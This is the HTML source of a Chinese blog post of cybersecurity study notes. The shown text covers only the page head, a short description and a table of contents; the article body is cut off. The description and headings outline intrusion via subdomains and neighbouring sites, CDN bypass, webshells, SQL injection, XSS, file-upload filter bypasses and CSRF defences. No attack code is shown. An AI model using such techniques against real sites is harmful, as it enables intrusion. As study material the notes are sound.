<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="丁真"><meta name="copyright" content="丁真"><meta name="generator" content="Hexo 5.4.0"><meta name="theme" content="hexo-theme-yun"><title>网安基础 | 世界最高城理塘</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/star-markdown-css@0.1.25/dist/yun/yun-markdown.min.css"><script src="//at.alicdn.com/t/font_1140697_dxory92pb0h.js" async></script><script src="https://cdn.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>document.addEventListener("DOMContentLoaded", () => {
  [".post-card",".post-content img"].forEach((target)=> {
    ScrollReveal().reveal(target);
  })
});
</script><link id="light-prism-css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@latest/themes/prism.css" media="(prefers-color-scheme: light)"><link id="dark-prism-css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@latest/themes/prism-tomorrow.css" media="(prefers-color-scheme: dark)"><link rel="icon" href="/favicon.ico"><link rel="mask-icon" href="/favicon.ico" color="#0078E7"><link rel="alternate icon" href="/yun.ico"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="preload" href="/js/utils.js" as="script"><link rel="preload" href="/js/hexo-theme-yun.js" as="script"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><script id="yun-config">
    const Yun = window.Yun || {};
    window.CONFIG = {"hostname":"example.com","root":"/","title":"世界最高城理塘","version":"1.6.1","mode":"dark","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}.","hits":"${hits} results found","hits_time":"${hits} results found in ${time} ms"},"anonymous_image":"https://cdn.jsdelivr.net/gh/YunYouJun/cdn/img/avatar/none.jpg","say":{"api":"https://v1.hitokoto.cn","hitokoto":true},"fireworks":{"colors":["102, 167, 221","62, 131, 225","33, 78, 194"]}};
  </script><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script src="/js/utils.js"></script><script src="/js/hexo-theme-yun.js"></script><meta name="description" content="基础常见名词域名主站安全性高，则可选用次级站点（子域名）作为突破口，进行渗透提权 子域名域名分为顶级域名和二级域名等，而在安全信息收集中，子域名一般指三级以上的域名 如 baidu.com 的子域名可以是 tieba.baidu.com 和 zhidao.baidu.com 旁站入侵旁站是指同一服务器上的其他网站，不一定属于同一家公司，注意区别子域名 很多时候某些网站不容易入侵，则可以查看该网站所">
<meta property="og:type" content="article">
<meta property="og:title" content="网安基础">
<meta property="og:url" content="http://example.com/2023/02/23/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80/index.html">
<meta property="og:site_name" content="世界最高城理塘">
<meta property="og:description" content="基础常见名词域名主站安全性高，则可选用次级站点（子域名）作为突破口，进行渗透提权 子域名域名分为顶级域名和二级域名等，而在安全信息收集中，子域名一般指三级以上的域名 如 baidu.com 的子域名可以是 tieba.baidu.com 和 zhidao.baidu.com 旁站入侵旁站是指同一服务器上的其他网站，不一定属于同一家公司，注意区别子域名 很多时候某些网站不容易入侵，则可以查看该网站所">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Rayucan/imageCloud/data/202302232152885.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Rayucan/imageCloud/data/202302232152948.jpeg">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Rayucan/imageCloud/data/202302271745542.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Rayucan/imageCloud/data/202302241716860.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Rayucan/imageCloud/data/202302241743097.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Rayucan/imageCloud/data/202302242153944.jpeg">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Rayucan/imageCloud/data/202302242128269.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Rayucan/imageCloud/data/202302261645077.jpg">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Rayucan/imageCloud/data/202302262325196.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Rayucan/imageCloud/data/202302262328714.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Rayucan/imageCloud/data/202303021700007.png">
<meta property="article:published_time" content="2023-02-23T12:20:37.000Z">
<meta property="article:modified_time" content="2023-07-17T03:09:06.373Z">
<meta property="article:author" content="丁真">
<meta property="article:tag" content="Web Security">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/Rayucan/imageCloud/data/202302232152885.png"><script src="/js/ui/mode.js"></script></head><body><script defer src="https://cdn.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="Table of Contents"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-list-ordered"></use></svg></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="Overview"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-passport-line"></use></svg></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="丁真"><img width="96" loading="lazy" src="https://cdn.jsdelivr.net/gh/Rayucan/imageCloud/data/20210515231431.jpg" alt="丁真"></a><div class="site-author-name"><a href="/about/">丁真</a></div><a class="site-name" href="/about/site.html">世界最高城理塘</a><sub class="site-subtitle"></sub><div class="site-desciption">太美丽啦理塘！</div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="Home"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-home-4-line"></use></svg></span></a><div class="site-state-item"><a href="/archives/" title="Archives"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-archive-line"></use></svg></span><span class="site-state-item-count">52</span></a></div><div class="site-state-item"><a href="/categories/" title="Categories"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-2-line"></use></svg></span><span class="site-state-item-count">2</span></a></div><div class="site-state-item"><a href="/tags/" title="Tags"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="site-state-item-count">8</span></a></div><a class="site-state-item hty-icon-button" target="_blank" rel="noopener" href="https://yun.yunyoujun.cn" title="文档"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-settings-line"></use></svg></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/Rayucan" title="GitHub" target="_blank" style="color:#181717"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-github-line"></use></svg></a></div></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80"><span class="toc-number">1.</span> <span class="toc-text">基础</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E5%90%8D%E8%AF%8D"><span class="toc-number">1.1.</span> <span class="toc-text">常见名词</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F%E5%90%8D"><span class="toc-number">1.1.1.</span> <span class="toc-text">域名</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AD%90%E5%9F%9F%E5%90%8D"><span class="toc-number">1.1.1.1.</span> <span class="toc-text">子域名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%97%81%E7%AB%99%E5%85%A5%E4%BE%B5"><span class="toc-number">1.1.1.2.</span> <span class="toc-text">旁站入侵</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#C-%E6%AE%B5"><span class="toc-number">1.1.1.3.</span> <span class="toc-text">C 段</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DNS%EF%BC%88Domain-Name-System%EF%BC%8C%E5%9F%9F%E5%90%8D%E7%B3%BB%E7%BB%9F%EF%BC%89"><span class="toc-number">1.1.2.</span> <span class="toc-text">DNS（Domain Name System，域名系统）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#DNS-%E5%8A%AB%E6%8C%81"><span class="toc-number">1.1.2.1.</span> <span class="toc-text">DNS 劫持</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DDoS-%E6%94%BB%E5%87%BB"><span class="toc-number">1.1.2.2.</span> <span class="toc-text">DDoS 攻击</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%83%B5%E5%B0%B8%E7%BD%91%E7%BB%9C"><span class="toc-number">1.1.2.3.</span> <span class="toc-text">僵尸网络</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CDN%EF%BC%88Content-Delivery-Network%EF%BC%8C%E5%86%85%E5%AE%B9%E5%88%86%E5%8F%91%E7%BD%91%E7%BB%9C%EF%BC%89"><span class="toc-number">1.1.3.</span> <span class="toc-text">CDN（Content Delivery Network，内容分发网络）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#CDN-%E5%88%86%E5%B1%82%E7%BB%93%E6%9E%84"><span class="toc-number">1.1.3.1.</span> <span class="toc-text">CDN 分层结构</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CDN-%E7%9A%84%E5%AD%98%E5%9C%A8%E5%AF%B9%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E6%9C%89%E4%BB%80%E4%B9%88%E5%BD%B1%E5%93%8D%EF%BC%9F"><span class="toc-number">1.1.3.2.</span> <span class="toc-text">CDN 的存在对安全测试有什么影响？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%88%A4%E6%96%AD%E7%9B%AE%E6%A0%87%E5%AD%98%E5%9C%A8-CDN-%E6%9C%8D%E5%8A%A1%EF%BC%9F"><span class="toc-number">1.1.3.3.</span> <span class="toc-text">如何判断目标存在 CDN 服务？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E7%BB%95%E8%BF%87-CDN%EF%BC%9F"><span class="toc-number">1.1.3.4.</span> <span class="toc-text">如何绕过 CDN？</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AD%90%E5%9F%9F%E5%90%8D%E6%9F%A5%E8%AF%A2"><span class="toc-number">1.1.3.4.1.</span> <span class="toc-text">子域名查询</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%82%AE%E4%BB%B6%E6%9C%8D%E5%8A%A1%E6%9F%A5%E8%AF%A2"><span class="toc-number">1.1.3.4.2.</span> <span class="toc-text">邮件服务查询</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%9B%BD%E5%A4%96%E8%AF%B7%E6%B1%82"><span class="toc-number">1.1.3.4.3.</span> <span class="toc-text">国外请求</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%81%97%E7%95%99%E6%96%87%E4%BB%B6%E5%85%A8%E7%BD%91%E6%89%AB%E6%8F%8F"><span class="toc-number">1.1.3.4.4.</span> <span class="toc-text">遗留文件全网扫描</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%BB%91%E6%9A%97%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E"><span class="toc-number">1.1.3.4.5.</span> <span class="toc-text">黑暗搜索引擎</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#DNS-%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95"><span class="toc-number">1.1.3.4.6.</span> <span class="toc-text">DNS 历史记录</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#DDoS-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3"><span class="toc-number">1.1.3.4.7.</span> <span class="toc-text">DDoS 暴力破解</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WAF%EF%BC%88Web-Application-Firewall%EF%BC%8CWeb-%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E9%98%B2%E7%81%AB%E5%A2%99%EF%BC%89"><span class="toc-number">1.1.4.</span> <span class="toc-text">WAF（Web Application Firewall，Web 应用程序防火墙）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BC%A0%E7%BB%9F%E9%98%B2%E7%81%AB%E5%A2%99"><span class="toc-number">1.1.4.1.</span> <span class="toc-text">传统防火墙</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8C%85%E8%BF%87%E6%BB%A4%E9%98%B2%E7%81%AB%E5%A2%99"><span class="toc-number">1.1.4.1.1.</span> <span class="toc-text">包过滤防火墙</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BB%A3%E7%90%86%E9%98%B2%E7%81%AB%E5%A2%99"><span class="toc-number">1.1.4.1.2.</span> <span class="toc-text">代理防火墙</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Webshell"><span class="toc-number">1.1.5.</span> <span class="toc-text">Webshell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95"><span class="toc-number">1.2.</span> <span class="toc-text">加密算法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%A3%E5%88%97%E7%AE%97%E6%B3%95%EF%BC%88%E5%93%88%E5%B8%8C%E7%AE%97%E6%B3%95%EF%BC%89"><span class="toc-number">1.2.1.</span> <span class="toc-text">散列算法（哈希算法）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#MD5"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">MD5</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SHA1"><span class="toc-number">1.2.1.2.</span> <span class="toc-text">SHA1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#HMAC"><span class="toc-number">1.2.1.3.</span> <span class="toc-text">HMAC</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86"><span class="toc-number">1.2.2.</span> <span class="toc-text">对称加密</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#DES"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">DES</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3DES"><span class="toc-number">1.2.2.2.</span> <span class="toc-text">3DES</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#AES"><span class="toc-number">1.2.2.3.</span> <span class="toc-text">AES</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86"><span class="toc-number">1.2.3.</span> <span class="toc-text">非对称加密</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#RSA"><span class="toc-number">1.2.3.1.</span> <span class="toc-text">RSA</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%96%E7%A0%81%E7%AE%97%E6%B3%95"><span class="toc-number">1.2.4.</span> <span class="toc-text">编码算法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Base64"><span class="toc-number">1.2.4.1.</span> <span class="toc-text">Base64</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#URL-%E7%BC%96%E7%A0%81"><span class="toc-number">1.2.4.2.</span> <span class="toc-text">URL 编码</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB"><span class="toc-number">1.3.</span> <span class="toc-text">中间人攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#IP-%E6%AC%BA%E9%AA%97"><span class="toc-number">1.3.1.</span> <span class="toc-text">IP 欺骗</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DNS-%E6%AC%BA%E9%AA%97"><span class="toc-number">1.3.2.</span> <span class="toc-text">DNS 欺骗</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ARP-%E6%AC%BA%E9%AA%97"><span class="toc-number">1.3.3.</span> <span class="toc-text">ARP 欺骗</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HTTPS-%E6%AC%BA%E9%AA%97"><span class="toc-number">1.3.4.</span> <span class="toc-text">HTTPS 欺骗</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSL-%E5%8A%AB%E6%8C%81"><span class="toc-number">1.3.5.</span> <span class="toc-text">SSL 劫持</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.</span> <span class="toc-text">Web 漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E7%B1%BB"><span class="toc-number">2.1.</span> <span class="toc-text">分类</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%AB%98%E5%8D%B1%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.1.1.</span> <span class="toc-text">高危漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%AD%E5%8D%B1%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.1.2.</span> <span class="toc-text">中危漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%8E%E5%8D%B1%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.1.3.</span> <span class="toc-text">低危漏洞</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL-%E6%B3%A8%E5%85%A5"><span class="toc-number">2.2.</span> <span class="toc-text">SQL 注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E7%B1%BB-1"><span class="toc-number">2.2.1.</span> <span class="toc-text">分类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%88%A4%E6%96%AD%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B1%BB%E5%9E%8B%EF%BC%9F"><span class="toc-number">2.2.2.</span> <span class="toc-text">如何判断数据库类型？</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A0%B9%E6%8D%AE%E5%89%8D%E5%90%8E%E7%AB%AF"><span class="toc-number">2.2.2.1.</span> <span class="toc-text">根据前后端</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A0%B9%E6%8D%AE%E7%AB%AF%E5%8F%A3"><span class="toc-number">2.2.2.2.</span> <span class="toc-text">根据端口</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A0%B9%E6%8D%AE%E7%89%B9%E6%9C%89%E5%87%BD%E6%95%B0"><span class="toc-number">2.2.2.3.</span> <span class="toc-text">根据特有函数</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#len-%E5%92%8C-length"><span class="toc-number">2.2.2.3.1.</span> <span class="toc-text">len 和 length</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#version-%E5%92%8C-version"><span class="toc-number">2.2.2.3.2.</span> <span class="toc-text">version 和 @@version</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#substr-%E5%92%8C-substring"><span class="toc-number">2.2.2.3.3.</span> <span class="toc-text">substr 和 substring</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A0%B9%E6%8D%AE%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%A4%84%E7%90%86%E6%96%B9%E5%BC%8F"><span class="toc-number">2.2.2.4.</span> <span class="toc-text">根据字符串处理方式</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#MySQL"><span class="toc-number">2.2.2.4.1.</span> <span class="toc-text">MySQL</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Oracle"><span class="toc-number">2.2.2.4.2.</span> <span class="toc-text">Oracle</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#SQL-Server"><span class="toc-number">2.2.2.4.3.</span> <span class="toc-text">SQL Server</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A0%B9%E6%8D%AE%E6%95%B0%E6%8D%AE%E5%BA%93%E7%89%B9%E6%9C%89%E7%9A%84%E8%A1%A8"><span class="toc-number">2.2.2.5.</span> <span class="toc-text">根据数据库特有的表</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#MySQL-1"><span class="toc-number">2.2.2.5.1.</span> <span class="toc-text">MySQL</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Oracle-1"><span class="toc-number">2.2.2.5.2.</span> <span class="toc-text">Oracle</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#SQL-Server-1"><span class="toc-number">2.2.2.5.3.</span> <span class="toc-text">SQL Server</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%82%B9%EF%BC%9F"><span class="toc-number">2.2.3.</span> <span class="toc-text">如何判断注入点？</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%80%81%E5%8A%9E%E6%B3%95"><span class="toc-number">2.2.3.1.</span> <span class="toc-text">老办法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%82%B9%E7%9A%84%E4%B8%80%E8%88%AC%E8%BF%87%E7%A8%8B"><span class="toc-number">2.2.3.2.</span> <span class="toc-text">判断注入点的一般过程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#root-%E5%9E%8B%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="toc-number">2.2.3.3.</span> <span class="toc-text">root 型注入点</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E9%98%B2%E5%BE%A1-SQL-%E6%B3%A8%E5%85%A5%EF%BC%9F"><span class="toc-number">2.2.4.</span> <span class="toc-text">如何防御 SQL 注入？</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8A%A0%E5%85%A5%E8%BD%AC%E4%B9%89%E5%AD%97%E7%AC%A6"><span class="toc-number">2.2.4.1.</span> <span class="toc-text">加入转义字符</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A2%84%E7%BC%96%E8%AF%91-SQL"><span class="toc-number">2.2.4.2.</span> <span class="toc-text">预编译 SQL</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS%EF%BC%88Cross-Site-Scripting%EF%BC%8C%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%EF%BC%89"><span class="toc-number">2.3.</span> <span class="toc-text">XSS（Cross Site Scripting，跨站脚本攻击）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8B-XSS"><span class="toc-number">2.3.1.</span> <span class="toc-text">存储型 XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8B-XSS"><span class="toc-number">2.3.2.</span> <span class="toc-text">反射型 XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DOM-%E5%9E%8B-XSS"><span class="toc-number">2.3.3.</span> <span class="toc-text">DOM 型 XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E9%98%B2%E5%BE%A1-XSS%EF%BC%9F"><span class="toc-number">2.3.4.</span> <span class="toc-text">如何防御 XSS？</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E5%AD%98%E5%82%A8%E5%9E%8B%E3%80%81%E5%8F%8D%E5%B0%84%E5%9E%8B"><span class="toc-number">2.3.4.1.</span> <span class="toc-text">防御存储型、反射型</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1-DOM-%E5%9E%8B"><span class="toc-number">2.3.4.2.</span> <span class="toc-text">防御 DOM 型</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">2.4.</span> <span class="toc-text">文件上传</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E7%BB%95%E8%BF%87"><span class="toc-number">2.4.1.</span> <span class="toc-text">文件类型绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%A4%B4%E7%BB%95%E8%BF%87"><span class="toc-number">2.4.2.</span> <span class="toc-text">文件头绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%90%8E%E7%BC%80%E7%BB%95%E8%BF%87"><span class="toc-number">2.4.3.</span> <span class="toc-text">文件后缀绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E6%9F%A5%E6%89%BE%E5%92%8C%E5%88%A4%E6%96%AD%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%EF%BC%9F"><span class="toc-number">2.4.4.</span> <span class="toc-text">如何查找和判断文件上传漏洞？</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95"><span class="toc-number">2.4.4.1.</span> <span class="toc-text">黑盒测试</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%99%BD%E7%9B%92%E6%B5%8B%E8%AF%95"><span class="toc-number">2.4.4.2.</span> <span class="toc-text">白盒测试</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CSRF%EF%BC%88Cross-Site-Request-Forgery%EF%BC%8C%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%EF%BC%89"><span class="toc-number">2.5.</span> <span class="toc-text">CSRF（Cross Site Request Forgery，跨站请求伪造）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E9%98%B2%E5%BE%A1-CSRF-%E6%94%BB%E5%87%BB%EF%BC%9F"><span class="toc-number">2.5.1.</span> <span class="toc-text">如何防御 CSRF 攻击？</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%A4%E7%89%8C%E6%A0%A1%E9%AA%8C"><span class="toc-number">2.5.1.1.</span> <span class="toc-text">令牌校验</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%AA%8C%E8%AF%81%E7%A0%81%E6%A0%A1%E9%AA%8C"><span class="toc-number">2.5.1.2.</span> <span class="toc-text">验证码校验</span></a></li></ol></li></ol></li></ol></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article"><link itemprop="mainEntityOfPage" href="http://example.com/2023/02/23/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="丁真"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="世界最高城理塘"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">网安基础</h1><div class="post-meta"><div class="post-time" style="display:inline-block"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-calendar-line"></use></svg></span> <time title="Created: 2023-02-23 20:20:37" itemprop="dateCreated datePublished" datetime="2023-02-23T20:20:37+08:00">2023-02-23</time><span class="post-meta-divider">-</span><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-calendar-2-line"></use></svg></span> <time title="Modified: 2023-07-17 11:09:06" itemprop="dateModified" datetime="2023-07-17T11:09:06+08:00">2023-07-17</time></div><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-line"></use></svg></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/%E7%AC%94%E8%AE%B0/" style="--text-color:dimgray" itemprop="url" rel="index"><span 